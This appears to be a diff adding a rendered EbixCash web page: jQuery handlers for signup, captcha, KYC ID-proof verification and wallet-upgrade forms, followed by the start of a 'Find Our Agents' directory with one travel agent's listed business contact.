+              var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+              var Wmobile = $('#Wmobile').val();
+              var Wemail = $('#Wemail').val();
+              var WencryptPwd = $('#WencryptPwd').val();
+              var Wfirst_name = $('#Wfirst_name').val();
+              var Wmiddle_name = $('#Wmiddle_name').val();
+              var Wlast_name = $('#Wlast_name').val();
+              var Widentity_type = $('#Widentity_type').val();
+              var Wgender = $('#Wgender').val();
+              var Wsms_notifications = $('#Wsms_notifications').val();
+              var Wautoassigncard = $('#Wautoassigncard').val();
+              var Widentity_number = $('#Widentity_number').val();
+            
+                 
+              $.ajax({
+                      
+                      
+                      url:"/ajax/wallet-user-resend-otp",
+                      headers: { "X-CSRFToken": token },
+                      method:'POST',
+                      data:{
+                          'Wmobile':Wmobile,
+                          'Wemail':Wemail,
+                          'WencryptPwd':WencryptPwd,
+                          'Wfirst_name':Wfirst_name,
+                          'Wmiddle_name':Wmiddle_name,
+                          'Wlast_name':Wlast_name,
+                          'Widentity_type':Widentity_type,
+                          'Widentity_number':Widentity_number,
+                          'Wgender':Wgender,
+                          'Wsms_notifications':Wsms_notifications,
+                          'Wautoassigncard':Wautoassigncard
+
+},
+                      success: function(data)
+                      {
+                        document.getElementById("Wotpmessage").innerHTML = data;
+                      }
+     });
+});
+</script> 
+<script>
+  $('#signupclose').click(function(){
+    $('#btnSignup').html("SIGN UP");
+  })
+</script>
+<script>
+  function checkpassword() {
+
+if (document.getElementById('reg_pwd').value == document.getElementById('confirmpassword').value) {
+  document.getElementById("btnSignup").disabled = false;
+} }
+
+
+//$("#loginotpnew").click(function(){
+ // $("#login, .modal-backdrop").hide();
+//});
+
+//$("#sendoptnew").click(function(){
+ // $("#loginotp, .modal-backdrop").hide();
+//});
+</script>
+
+
+
+
+<script>
+  function startTimer(duration, display) {
+    var timer = duration,
+      minutes, seconds;
+    const intervel = setInterval(function () {
+      minutes = parseInt(timer / 60, 10)
+      seconds = parseInt(timer % 60, 10);
+
+      minutes = minutes < 10 ? "0" + minutes : minutes;
+      seconds = seconds < 10 ? "0" + seconds : seconds;
+      display.textContent = minutes + ":" + seconds;
+      if (--timer < 0) {
+        clearInterval(intervel)
+        const resend = document.getElementById("resendbtn")
+        resend.innerHTML = `<span onclick='timerFunction()' class='text-primary' style='cursor: pointer'><u>Resend OTP</u></span>`
+      }
+    }, 1000);
+  }
+
+  function timerFunction() {
+    document.getElementById("resendbtn").innerHTML = `Resend OTP after: <span id="timer">01:00</span>`
+    var oneMinute = 59;
+    var display = document.getElementById('timer');
+    startTimer(oneMinute, display);
+  };
+
+  $('#refresh_captcha').on('click', function (e) {
+   e.preventDefault();
+   var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+        $.ajax({
+            url: "/ajax/refresh_captcha_img/",
+
+            method: 'POST',
+            headers: { "X-CSRFToken": token },
+            
+            success: function (data) {
+              
+              $("#login_captcha_img").attr('src',"data:image/png;base64,"+data.imgData);
+                
+            }
+        });
+  });
+
+  $('#verify_idproof').on('click', function (e) {
+   e.preventDefault();
+   if($('#verify_id_text').text() == '✅ Verified'){
+      return false
+   }
+   
+   $('#verify_id_error').html('')
+    $('#verify_id_div').attr('hidden',true)
+   var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+   var first_name = $('#first_name').val();
+   var middle_name = $('#middle_name').val();
+   var last_name = $('#last_name').val();
+   var id_type=$('#identity_type').val();
+   var id_number=$('#identity_number').val();
+   var dob=$('#signup_dob').val()
+   if (first_name == ''){
+    $('#verify_id_error').html('Please enter First Name.')
+      $('#verify_id_div').attr('hidden',false)
+   }
+   
+   else if(id_type == ''){
+      $('#verify_id_error').html('Please select ID Proof.')
+      $('#verify_id_div').attr('hidden',false)
+   }
+   else if(id_type == 'D' && $('#signup_dob').val() == ''){
+    
+      $('#verify_id_error').html('Please enter Date Of Birth or choose a different ID Proof.')
+      $('#verify_id_div').attr('hidden',false)
+    
+    
+   }
+   else if(id_number==''){
+    $('#verify_id_error').html('Please enter ID Proof Number.')
+    $('#verify_id_div').attr('hidden',false)
+   }
+   else{
+    
+    $('#verify_id_text').text('Processing...')
+    data = {'id_type':id_type,
+            'id_number':id_number,
+            'signup_dob':dob,
+            'first_name':first_name,
+            'middle_name':middle_name,
+            'last_name':last_name}
+        $.ajax({
+            url: "/ajax/validate_idproof/",
+            data:data,
+            method: 'POST',
+            headers: { "X-CSRFToken": token },
+            
+            success: function (data) {
+              
+              if (data.status_code == 'S'){
+                $('#verify_id_text').addClass('text-success')
+                $('#verify_id_text').text('✅ Verified')
+                $('#verified_name').val(data.name)
+                $('#is_verified').val('true')
+                $('#verified_idtype').val(data.id_type)
+                $('#verified_idnumber').val(data.id_number)
+               
+                
+
+              }
+              else{
+                
+                $('#verify_id_text').text('Verify')
+                $('#verify_id_error').html(data.status_desc)
+                $('#verify_id_div').attr('hidden',false)
+              }
+            }
+        });
+   }
+  
+   
+  });
+
+</script>
+
+
+
+
+
+
+
+
+
+
+  <!-- login&Signup end here -->
+
+  <!-- Side and Top Navbar starts here -->
+  
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNFDJH2"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+  
+
+<!-- Password Reset Box -->
+<div class="modal fade" id="exampleModalforgot" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-body p-4">
+        <p style="line-height: 1.5!important;">For security reasons, we suggest you to reset you password.</p>
+        <div class="form-group row align-items-center mt-4">
+          <div class="col-12 text-center">
+            <button type="button" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px;" onclick="location.href = '/account/edit/password/';sessionStorage.setItem('show_reset_pass','false')">Reset</button>
+            <button type="button" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px; margin-right:15px;" onclick="$('#exampleModalforgot').modal('hide');sessionStorage.setItem('show_reset_pass','false')" >Cancel</button> 
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script>
+  
+
+  $(document).ready(function() {
+    ""
+  });
+
+ 
+</script>
+<!-- End Password Reset Box -->
+
+
+
+<!-- NEW HEADER BEGIN HERE -->
+<header class="topbar">
+  <div class="container-fluid">
+  <nav class="navbar navbar-expand-lg navbar-light bg-transparent px-2">
+      <a class="navbar-brand" href="/">
+        <img src="/static/Common/img/icons/logo.png" alt="EBIXCASH">
+      </a>
+      <!-- after login code -->
+      
+      <span class="navbar-text myaccount ms-auto">
+        <a class="login nav-link btn btn-rounded btn-purple btn-pill" id="loginanchor" href="#login"
+          data-bs-toggle="modal">
+          <i class="fas fa-user-circle mr-md-2 text-white align-middle"></i>
+          <span class="d-none d-md-inline-block">Login/SignUp</span>
+        </a>
+      </span>
+      
+
+    <!-- Computer Icon (Always Visible) -->
+    <div class="icon" data-bs-toggle="tooltip" data-bs-placement="top" title="Accessibility" onclick="toggleToolbar()">
+    
+<svg xmlns="http://www.w3.org/2000/svg" height="30px" viewBox="0 -960 960 960" width="30px" fill="#1f1f1f">
+  <path d="M329.33-120v-66.67h84V-280H146.67q-27 0-46.84-19.83Q80-319.67 80-346.67v-426.66q0-27 19.83-46.84Q119.67-840 146.67-840h666.66q27 0 46.84 19.83Q880-800.33 880-773.33v426.66q0 27-19.83 46.84Q840.33-280 813.33-280H546.67v93.33h84V-120H329.33ZM146.67-346.67h666.66v-426.66H146.67v426.66Zm0 0v-426.66 426.66Z"/>
+</svg>
+  </div>
+  <!-- Toolbar (Initially Hidden) -->
+  <div class="toolbar" id="toolbar">
+    <p class="mb-0"><strong>Accessibility</strong></p>
+    <div class="w-100 newfonttext float-start"><span>Text Size Increase </span>  <button id="increaseFont">A+</button> </div>
+    <div class="w-100 newfonttext float-start"> <span>Text Size Decreaser</span>   <button id="decreaseFont">A-</button> </div>
+    <div class="w-100 newfonttext float-start"><span>Text Size Reset</span>  <button id="resetFont">A</button> </div>
+    <div class="w-100 newfonttext float-start"> <span>High Contrast Mode</span> 
+      <a href="javascript:highContrast()" class="dropdown-item link_highcontrast" title="High Contrast">A</a>
+    </div>
+    <div class="w-100 newfonttext float-start"><span>Normal Contrast </span>
+      <a href="javascript:normalContrast()" class="dropdown-item link_highcontrast_reset" title="Normal Contrast">A</a>
+    </div>
+  </div>
+</nav>
+
+  </div>
+</header>
+<!-- NEW HEADER END HERE -->
+
+<!-- NEW NAVBAR BEGIN HERE -->
+<nav class="navbar navbar-light purple-navbar">
+  <div class="mx-auto menu-inner">
+    <ul class="navbar-nav mr-auto">
+      <li class="nav-item">
+        <a class="nav-link discover_ebixcash" href="/discover-ebixcash/">
+          <span><span class="d-none d-md-inline-block">Discover</span> EbixCash</span>
+        </a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link investora" href="/investor-relation/">
+          <span>Investors</span>
+        </a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link ebixcash_consumer" href="/ebixcash-consumer/">
+          <span><span class="d-none d-md-inline-block">EbixCash for </span> Consumers</span>
+        </a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link ebixcash_business" href="/ebixcash-business/">
+          <span> <span class="d-none d-md-inline-block">EbixCash for </span> Business</span>
+        </a>
+      </li>
+    </ul>
+  </div>
+</nav>
+<!-- NEW NAVBAR END HERE -->
+
+
+<!-- Wallet Upgrade (send otp) form start here -->
+
+<div class="modal fade" id="walletupgrade" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="walletupgrade"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="walletupgradeTitle">Activate EbixCash Wallet</h5>
+      <!--   <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='walletupgradeform' autocomplete="off">
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" id="b2cmobile" placeholder=""
+                  name="b2cmobile" value="" disabled>
+              </div>
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" id="upgrade_firstname" name="upgrade_firstname" value="" placeholder="First Name" >
+              </div>
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" id="upgrade_middlename" name="upgrade_middlename" value="" placeholder="Middle Name" >
+              </div>
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" id="upgrade_lastname" name="upgrade_lastname" value="" placeholder="Last Name">
+              </div>
+              
+              <div class="form-group mb-3">
+                <input type="text" onfocus="(this.type='date')" name="upgrade_dob" id="upgrade_dob" class="form-control" placeholder="Date Of Birth" value=""  >
+          
+              </div>
+              <div class="form-group mb-3">
+                <select name="upgrade_identity_type" id="upgrade_identity_type" class="form-control form-select">
+                  <option value="" selected>Select Identity Proof</option>
+                  <!--                                  <option value="A">Aadhaar Card</option> -->
+                  <option value="D">Driving License</option>
+                  <option value="I">Pan Card</option>
+                  <option value="V">Voter Identity Card</option>
+                </select>
+              </div>
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" style='text-transform:uppercase' name='upgrade_identity_number' id="upgrade_identity_number" placeholder="Identity Proof Number"
+                  name="wallet_identity_number">
+              </div>
+              <div class="form-group mb-3">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control toggleupgrade" id="b2c_password"
+                    placeholder="Enter Password" 
+                     name="b2c_password">
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"  style="height:50px; margin-left:-8px;"><i class="fas fa-eye-slash toggle-password-walletupgrade"></i></div>
+                  </div>
+                </div>
+              </div>
+              <div id="walletupgrademessage" class="text-danger"></div>
+              <!-- <div class="form-group mb-3">
+                <button type="submit" id="walletupgradebtn" class="custmbtn btn btn-primary btn-block"
+                  >Submit</button>
+              </div> -->
+              <div class="col-12 text-center">
+                <button type="button" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px; margin-right:15px;" onclick="loguserout()" >Logout</button> 
+                
+                <button type="submit" id="walletupgradebtn" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px; margin-right:15px;"
+                  >Submit</button>
+              </div>
+            </form>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Wallet Upgrade modal (send otp) form end here -->
+
+<!-- Wallet IDPROOF form start here -->
+
+<div class="modal fade" data-bs-backdrop="static" data-bs-keyboard="false" id="idupdate" tabindex="-1" role="dialog" aria-labelledby="idupdate"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <div style="margin:0 auto;">
+          <h5 class="modal-title text-center">Action Required</h5>
+          <p class="text-center" style="color: #f2224e; margin-bottom: 0;">(Update ID Proof)</p>
+        </div>
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='idupdateform' autocomplete="off">
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              
+              <div class="form-group">
+                <input type="text" class="form-control" id="idupdate_b2cmobile" placeholder=""
+                  name="idupdate_b2cmobile" value="" disabled>
+              </div>
+              <div class="form-group">
+                <input type="text" class="form-control" id="idupdate_firstname" name="idupdate_firstname" value="" placeholder="First Name" required>
+              </div>
+              <div class="form-group">
+                <input type="text" class="form-control" id="idupdate_middlename" name="idupdate_middlename" value="" placeholder="Middle Name" >
+              </div>
+              <div class="form-group">
+                <input type="text" class="form-control" id="idupdate_lastname" name="idupdate_lastname" value="" placeholder="Last Name">
+              </div>
+              
+              <div class="form-group">
+                <input type="text" onfocus="(this.type='date')" name="idupdate_dob" id="idupdate_dob" class="form-control" placeholder="Date Of Birth" value=""  >
+              </div>
+              <div class="form-group">
+                <select name="idupdate_identity_type" id="idupdate_identity_type" class="form-control">
+                  <option value="" selected>Select Identity Proof</option>
+                  <!--                                  <option value="A">Aadhaar Card</option> -->
+                  <option value="D">Driving License</option>
+                  <option value="I">Pan Card</option>
+                  <option value="V">Voter Identity Card</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <input type="text" class="form-control" style='text-transform:uppercase' id="idupdate_identity_number" placeholder="Identity Proof Number"
+                  name="wallet_identity_number">
+              </div>
+              
+             
+
+              <div class="form-group">
+                <div class="custom-control custom-checkbox">
+                  <input class="custom-control-input" type="checkbox" id="agreeprovide" required>
+                  <label class="custom-control-label w-100" for="agreeprovide">I agree to provide my OVD number as KYC detail <details>
+                    <summary>...</summary>
+                 <div class="summarybox">   I agree to provide my OVD number as KYC. Details shared by me shall be used for my evaluation & verification purposes. I authorise EbixCash to use this data for EbixCash Wallet KYC updation/upgradation</div>
+                </details></label>
+                </div>
+                <div class="text-danger" id="idupdatemessage_fail"></div>
+                <div class="text-success" id="idupdatemessage_success"></div>
+              </div>
+
+              
+              
+
+
+              <div class="col-12 text-center">
+                <button type="button" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px; margin-right:15px;" onclick="loguserout()" >Logout</button> 
+                
+                <button type="button" id="ipupdatebtn" class="custmbtn btn btn-primary" style="padding-left:20px; padding-right:20px; margin-right:15px;"
+                  >Submit</button>
+              </div>
+            </form>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<style>
+  details {display:inline;}
+
+  /* Style the summary element */
+  summary {
+    font-weight: bold;
+    margin: -0.5em -0.5em 0;
+    padding: 0.5em;
+    list-style: none; /* Remove the default list-style (the arrow) */
+  }
+
+  details[open] { }
+
+details[open] .summarybox{padding:10px;   position: absolute; left: 0; bottom:35px;    width: 100%;    z-index: 99;    background: #fff;    border: #ccc 1px solid;    border-radius: 10px;   box-shadow:    inset 0 -3em 3em rgba(0, 0, 0, 0.1),    0 0 0 2px rgb(255, 255, 255),
+    0.3em 0.3em 1em rgba(0, 0, 0, 0.3);}  details[open] summary {width:100%;}
+</style>
+<script>
+  const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+  tooltipTriggerList.forEach(function (tooltipTriggerEl) {
+    new bootstrap.Tooltip(tooltipTriggerEl)
+  })
+</script>
+
+
+<script>
+  $('#ipupdatebtn').on('click',function(e){
+    e.preventDefault();
+    $('#idupdatemessage_success').text('')
+    $('#idupdatemessage_fail').text('')
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    first_name=$('#idupdate_firstname').val()
+    middle_name=$('#idupdate_middlename').val()
+    last_name=$('#idupdate_lastname').val()
+    dob=$('#idupdate_dob').val()
+    id_type=$('#idupdate_identity_type').val()
+    id_number=$('#idupdate_identity_number').val()
+
+    if(first_name == ''){
+      $('#idupdatemessage_fail').text('Error: Enter First Name')
+    }
+    else if(id_type == ''){
+      $('#idupdatemessage_fail').text('Error: Select ID Proof Type')
+    }
+    else if(id_number == ''){
+      $('#idupdatemessage_fail').text('Error: Enter ID Proof Number')
+    }
+    
+    else if(id_type == 'D' && dob == ''){
+      $('#idupdatemessage_fail').text('Error: Enter Date Of Birth or Select a Different ID Type.')
+    }
+    else if($('#agreeprovide').prop('checked') == false){
+      $('#idupdatemessage_fail').text('Error: Please click the consent checbox.')
+    }
+    else{
+      $('#ipupdatebtn').attr('disabled',true);
+      $.ajax({
+      url: "/ajax/update_id_proof/",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+            "first_name":first_name,
+            "middle_name":middle_name,
+            "last_name":last_name,
+            "id_type":id_type,
+            "id_number":id_number,
+            "dob":dob
+            },
+      success: function (data) {
+        $('#ipupdatebtn').attr('disabled',false);
+        if (data.status_code == 'S') {
+          $('#idupdatemessage_success').text(data.status_desc)
+          setTimeout("loguserout();", 6000);
+        }
+        else {
+
+          $('#idupdatemessage_fail').text('Error: '+data.status_desc)
+        }
+      }
+    });
+
+    }
+  })
+</script>
+
+<!-- Wallet Upgrade modal (send otp) form end here -->
+
+<!-- Wallet Upgrade (verify otp) form start here -->
+
+<div class="modal fade" id="verifywalletupgrade" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="verifywalletupgrade"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="verifywalletupgradeTitle">Activate EbixCash Wallet</h5>
+       <!--  <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+      </div>
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='verifywalletupgradeform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div id="verifywalletupgrademessage_s" class='text-success'></div>
+              <div id="verifywalletupgrademessage" class='text-danger'></div>
+              <div id="hideupgradeotp">
+                <input type="hidden" id="verify_wallet_identity_type" name="verify_wallet_identity_type" >
+                <input type="hidden" id="verify_wallet_identity_number" name="verify_wallet_identity_number" >
+                <input type="hidden" id="verify_wallet_password" name="verify_wallet_password">
+                <div class="form-group">
+                  <input type="text" class="form-control" id="verifyb2cmobile"
+                    placeholder="" name="verifyb2cmobile"
+                    value="" disabled>
+                </div>
+                <div class="form-group">
+                  <div class="input-group mb-2">
+                    <input type="password" class="form-control toggleotpupgrade" id="verifywalletotp"
+                      placeholder="Enter Mobile OTP" minlength="6" maxlength="6" name="verifywalletotp"
+                      onkeyup="return verifyotpbtn()" autocomplete="off">
+                    <div class="input-group-prepend">
+                      <div class="input-group-text"><i class="fas fa-eye-slash toggle-upgrade"></i>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <p class="text-right mb-2"><a id="walletupgradeotp" class="resendotpc">Resend OTP</a></p>
+                  <!-- <p id="displaywalletotp"></p> -->
+                </div>
+                <div class="form-group">
+                  <button type="submit" id="verifywalletupgradebtn" class="custmbtn btn btn-primary btn-block"
+                    disabled>Submit</button>
+                </div>
+              </div>
+            </form>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Wallet Upgrade modal (verify otp) form end here -->
+<script>
+  $(document).ready(function (){
+    ""
+    var dtToday = new Date();
+    
+    var month = dtToday.getMonth() + 1;
+    var day = dtToday.getDate();
+    var year = dtToday.getFullYear();
+    if(month < 10)
+        month = '0' + month.toString();
+    if(day < 10)
+        day = '0' + day.toString();
+    
+    var maxDate = year + '-' + month + '-' + day;
+    $('#idupdate_dob').attr('max', maxDate);
+    $('#upgrade_dob').attr('max', maxDate);
+  });
+  $(".toggle-password-walletupgrade").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleupgrade");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+  $('#walletupgradeform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+
+    event.preventDefault();
+    $('#walletupgrademessage').html('');
+    if($('#upgrade_firstname').val() == ''){
+      $('#walletupgrademessage').text('Error: Enter First Name')
+    }
+    else if($('#upgrade_identity_type').val() == ''){
+      $('#walletupgrademessage').text('Error: Select ID Proof Type')
+    }
+    else if($('#upgrade_identity_number').val() == ''){
+      $('#walletupgrademessage').text('Error: Enter ID Proof Number')
+    }
+    
+    else if($('#upgrade_identity_type').val() == 'D' && $('#upgrade_dob').val() == ''){
+      $('#walletupgrademessage').text('Error: Enter Date Of Birth or Select a Different ID Type.')
+    }
+    else if($('#b2c_password').val() == ''){
+      $('#walletupgrademessage').text('Error: Enter Your Login Password')
+    }
+    else{
+      $('#walletupgradebtn').html('Please Wait...')
+      $('#walletupgradebtn').attr('disabled',true)
+
+    $.ajax({
+      url: "/ajax/wallet-upgrade",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        
+        
+        $('#walletupgradebtn').html('Submit')
+        $('#walletupgradebtn').attr('disabled',false)
+          
+        if (data.status_code == 'S') {
+          $('#verify_wallet_identity_type').val($('#upgrade_identity_type').val());
+          $('#verify_wallet_identity_number').val($('#upgrade_identity_number').val());
+          $('#verify_wallet_password').val($('#b2c_password').val());
+          // open next model and close current model
+          $("#walletupgrade").modal('hide');
+          $("#verifywalletupgrade").modal('show');
+        }
+        else {
+
+          $('#walletupgrademessage').html(data.status_desc);
+        }
+        
+        
+      }
+    });
+  }
+  }
+  );
+
+
+  function loguserout() {
+    window.location.href = "/logout/";
+  }
+
+  $('#verifywalletupgradeform').on('submit', function (event) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $('#verifywalletupgrademessage').html('');
+    $('#verifywalletupgrademessage_s').html('');
+    event.preventDefault();
+    if($('#verifywalletotp').val()==''){
+      $('#verifywalletupgrademessage').html('Enter OTP');
+    }
+   else{
+    $('#verifywalletupgradebtn').html('Please Wait...')
+      $('#verifywalletupgradebtn').attr('disabled',true)
+    $.ajax({
+      url: "/ajax/verify-wallet-upgrade",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        $('#verifywalletupgradebtn').html('Submit')
+      $('#verifywalletupgradebtn').attr('disabled',false)
+        if (data.status_code == 'S') {
+           
+          $('#verifywalletupgrademessage_s').html(data.status_desc);
+          
+          setTimeout("loguserout();", 5000);
+
+        }
+        else {
+          $('#verifywalletupgrademessage').html(data.status_desc);
+          
+        }
+      }
+    });
+  }
+  }
+  );
+
+
+  function upgradesubmitbtn() {
+    if (document.getElementById('upgrade_identity_type').value == "" || document.getElementById('upgrade_identity_number').value == "" || document.getElementById('b2c_password').value == "") {
+      document.getElementById("walletupgradebtn").disabled = true;
+    }
+    else {
+      document.getElementById("walletupgradebtn").disabled = false;
+    }
+  }
+
+  function verifyotpbtn() {
+    if (document.getElementById('verifywalletotp').value == "") {
+      document.getElementById('verifywalletupgradebtn').disabled = true;
+    }
+    else {
+      document.getElementById('verifywalletupgradebtn').disabled = false;
+    }
+  }
+</script>
+<script>
+
+  $(".toggle-upgrade").click(function () {
+
+    $(this).toggleClass("fa-eye-slash fa-eye");
+    var input = $(".toggleotpupgrade");
+    if (input.attr("type") === "password") {
+      input.attr("type", "text");
+    } else {
+      input.attr("type", "password");
+    }
+  });
+</script>
+
+
+<script>
+  $("#walletupgradeotp").click(function () {
+    document.getElementById("verifywalletupgrademessage").innerHTML = "Resending OTP...";
+    event.preventDefault();
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    var wallet_identity_type = $('#verify_wallet_identity_type').val();
+    var wallet_identity_number = $('#verify_wallet_identity_number').val();
+    var b2c_password = $('#verify_wallet_password').val();
+
+    $.ajax({
+      url: "/ajax/wallet-upgrade",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data:
+      {
+        'wallet_identity_type': wallet_identity_type,
+        'wallet_identity_number': wallet_identity_number,
+        'b2c_password': b2c_password
+      },
+      success: function (data) {
+
+        document.getElementById("verifywalletupgrademessage").innerHTML = data.status_desc;
+      }
+    });
+  });
+</script>
+<!-- DROPDOWN ON HOVER -->
+<script>
+  $(document).ready(function () {
+    $(".dropdown.myaccount").hover(function () {
+      $(this).toggleClass("show");
+      $(this).children(".dropdown-menu").toggleClass("show");
+      $(this).children(".dropdown-toggle").toggleClass("active");
+    });
+
+    $(".purple-navbar .dropdown > .dropdown-toggle").on("click", function (e) {
+      e.stopPropagation();
+    });
+  })
+</script>
+
+<script>
+  $(document).ready(function(){
+      $("#GPRtoggleButton").click(function(){
+          $("#myGPRDiv").toggle();
+      });
+  });
+
+</script>
+
+  <!-- End of Side and Top Navbar -->
+
+<!-- INNER PAGE BANNER BEGIN HERE -->
+<div class="container-fluid">
+  <div class="inner_banner">
+      <img src="/static/Common/img/Inner-page-Header.jpg" class="img-fluid d-none d-md-inline-block" alt="EbixCash Airport of Financial Transactions">
+      <img src="/static/Common/img/inner-page-mobile-header.jpg" class="img-fluid d-block d-md-none" alt="EbixCash Airport of Financial Transactions">
+  </div>
+</div>
+<!-- INNER PAGE BANNER END HERE -->
+
+<script type="application/ld+json">
+	{
+	"@context": "https://schema.org",
+	"@type": "BreadcrumbList",
+	"itemListElement": [
+	{
+	"@type": "ListItem",
+	"position": 1,
+	"item": {
+	"@id": "https://ebixcash.com/ebixcash-consumer/ ",
+	"name": "EbixCash For Consumer"
+	}
+	},
+	{
+	"@type": "ListItem",
+	"position": 2,
+	"item": {
+	"@id": "https://ebixcash.com/ebixcash-consumer/fastag/",
+	"name": "Fasttag"
+	}
+	}
+	]
+	} 
+	</script>
+
+
+<!-- BREADCRUMB SECTION BEGIN HERE -->
+<div class="container-fluid">
+  <div class="row">
+      <div class="col-12">
+          <div class="breadcrumb-section">
+              <nav aria-label="breadcrumb">
+                  <ol class="breadcrumb  bg-transparent px-0 border-bottom">
+                      <li class="breadcrumb-item"><a href="/">Home</a></li>
+                      <li class="breadcrumb-item active" aria-current="page">Find Our Agents</li>
+                  </ol>
+              </nav>
+          </div>
+      </div>
+  </div>
+</div>
+<!-- BREADCRUMB SECTION END HERE -->
+
+  <div class="wrapper pb-5">
+    <div id="content">
+
+    
+      <!--faq start here-->
+      <div class="row">
+        
+        <div class="col-xl-11 mx-auto py-3 faq">
+          <h1 class="text-amaranth fw700 mb-3 font-roboto h2hd mb-4">Find Our Agents</h1>
+
+          <form  method="post">
+            <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+            <div class="input-group mb-3">
+                <input type="text" class="form-control" id="search_text" name="search_text" placeholder="Enter First Name or Pincode" value="110001" required>
+                <button type="submit" class="btn btn-primary mb-3 px-5" style="height: 50px;">Search</button>
+            </div>
+          </form>
+
+          <div class="accordion" id="accordion">
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq1"> <a href="#collapse1" class="" data-bs-toggle="collapse" data-target="#collapse1" aria-expanded="true" aria-controls="collapse1">
+                    <h6 class="mb-0"><span></span>JHON AND WEXOES TRAVELS DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse1" class="collapse show" aria-labelledby="faq1" data-parent="#accordion1">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                      <p><strong>Agent Name: </strong>Kunal Chadha</p>
+                      <p><strong>Contact: </strong>9711132191</p>
+                      <p><strong>Email: </strong>jhonwexoestravels@gmail.com</p>
